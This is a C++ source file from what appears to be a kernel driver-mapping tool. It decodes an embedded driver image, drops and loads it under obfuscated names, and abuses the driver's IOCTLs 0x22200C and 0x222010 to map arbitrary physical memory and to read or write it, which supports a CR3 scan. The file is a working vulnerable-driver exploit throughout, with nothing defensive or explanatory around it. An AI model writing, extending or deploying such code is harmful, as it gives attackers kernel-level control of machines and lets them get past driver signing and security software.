#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_CORMEM)

#include "CorMemBackend.h"
#include "../Common/vDriverLoader.h"
#include "cormem_sys.h"

namespace
{
	constexpr DWORD CorMemMapBufferIoctl   = 0x22200C;
	constexpr DWORD CorMemUnmapBufferIoctl = 0x222010;

	constexpr uint64_t PhysicalAddressMask = 0x000ffffffffff000ull;
}

std::string CorMemBackend::Name( ) const
{
	return pstra( "CorMem" );
}

NTSTATUS CorMemBackend::LoadDevice( )
{
	auto image = Tools::DecodePEBuffer( cormem_sys, sizeof( cormem_sys ) );

	return DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\CORMEM" ),
		image.data( ), image.size( ), &m_Device, 0x91B0, pstra( "CORMEM" ) );
}

NTSTATUS CorMemBackend::UnloadDevice( )
{
	CloseMapperDevice( &m_Device );
	return UnloadMapperDriver( pstra( "CORMEM" ) );
}

bool CorMemBackend::MapPhysical( uint64_t physicalAddress, uint64_t size, uint64_t* virtualAddress )
{
	if ( !virtualAddress || !size )
		return false;

	*virtualAddress = 0;

	if ( ( physicalAddress & ~PhysicalAddressMask ) != 0 )
	{
		if ( !m_QuietMode )
			LOG_SEC( "[-] - [CorMem] MapPhysical rejected bogus pa=0x%llx size=0x%llx", physicalAddress, size );
		return false;
	}

	struct MapBufferInput
	{
		uint64_t PhysicalAddress;
		uint64_t Size;
		uint64_t Flags;
	};

	MapBufferInput input {};
	input.PhysicalAddress = physicalAddress;
	input.Size = size;
	input.Flags = 1;

	uint64_t mappedVa = 0;
	DWORD bytesReturned = 0;

	bool mapped = false;
	DWORD gle = 0;

	// During the CR3 scan (quiet mode) failures are expected and frequent;
	// retrying each one with sleeps would stall the scan for minutes.
	const int maxAttempts = m_QuietMode ? 1 : 10;

	for ( int attempt = 0; attempt < maxAttempts && !mapped; ++attempt )
	{
		if ( attempt > 0 )
			Sleep( 20 );

		mapped = DeviceIoControl( m_Device, CorMemMapBufferIoctl, &input, sizeof( input ), &mappedVa, sizeof( mappedVa ), &bytesReturned, nullptr ) != FALSE;
		gle = GetLastError( );
	}

	if ( !mapped )
	{
		if ( !m_QuietMode )
			LOG_SEC( "[-] - [CorMem] MapPhysical failed pa=0x%llx size=0x%llx gle=%lu", physicalAddress, size, gle );
		return false;
	}

	*virtualAddress = mappedVa;
	return *virtualAddress != 0;
}

bool CorMemBackend::UnmapPhysical( uint64_t virtualAddress )
{
	if ( !virtualAddress )
		return false;

	DWORD bytesReturned = 0;

	return DeviceIoControl( m_Device, CorMemUnmapBufferIoctl, &virtualAddress, sizeof( virtualAddress ), nullptr, 0, &bytesReturned, nullptr ) != FALSE;
}

bool CorMemBackend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, uint64_t bytes, bool write )
{
	if ( !buffer || !bytes )
		return false;

	const auto pageOffset = physicalAddress & 0xFFF;
	const auto alignedPa = physicalAddress & ~0xFFFull;
	const auto mapSize = ( pageOffset + bytes + 0xFFF ) & ~0xFFFull;

	uint64_t mappedVa = 0;

	if ( !MapPhysical( alignedPa, mapSize, &mappedVa ) )
		return false;

	bool result = false;

	const auto ptr = r_cast<uint8_t*>( mappedVa ) + pageOffset;

	__try
	{
		if ( write )
			memcpy( ptr, buffer, s_cast<size_t>( bytes ) );
		else
			memcpy( buffer, ptr, s_cast<size_t>( bytes ) );

		result = true;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		if ( !m_QuietMode )
			LOG_SEC( "[-] - [CorMem] ReadWritePhysical exception pa=0x%llx size=0x%llx write=%d", physicalAddress, bytes, write ? 1 : 0 );
	}

	UnmapPhysical( mappedVa );
	return result;
}




#endif // KZEROMAPPER_ENABLE_CORMEM